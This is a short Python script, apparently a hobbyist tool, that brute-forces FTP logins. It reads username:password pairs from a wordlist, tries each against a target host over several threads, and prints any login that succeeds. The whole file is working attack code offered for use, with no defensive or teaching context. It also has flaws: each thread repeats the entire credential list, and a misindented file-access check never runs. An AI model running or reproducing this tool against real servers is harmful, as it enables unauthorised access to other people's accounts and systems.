from ftplib import FTP
import sys
import os
from termcolor import colored
import threading

print_lock = threading.Lock()


for x in sys.argv[2:]:
	host =sys.argv[1]
	filename = sys.argv[2]

if not os.path.isfile(filename):
		print ('[-] ' + filename + ' does not exist.')
		exit(0)
		if not os.access(filename, os.R_OK):
			print ('[-] ' + filename + ' access denied.')
			exit(0)
print ('[+] Reading-------------[+]: ' + filename)
	


count = len(open(filename).readlines( ))


def brutelogin(hostname, filename):
	f=open(filename,'r')
	for i in f.readlines():
		
		username = i.split(':')[0]
		passWord = i.split(':')[1].strip('\r').strip('\n')
		with print_lock:
			print (colored("[+] Trying: "+username+"/"+passWord,"red"))
			try:
				ftp = FTP(hostname)
				ftp.login(user=username,passwd=passWord);
				print(colored('\n[*] ' + str(hostname) +' FTP Logon Succeeded: '+username+"/"+passWord,"green"))
				ftp.quit()
			except Exception as e:
				pass

	
for i in range(count):

	t= threading.Thread(target= brutelogin,args=(host,filename))
	
	
	t.start()
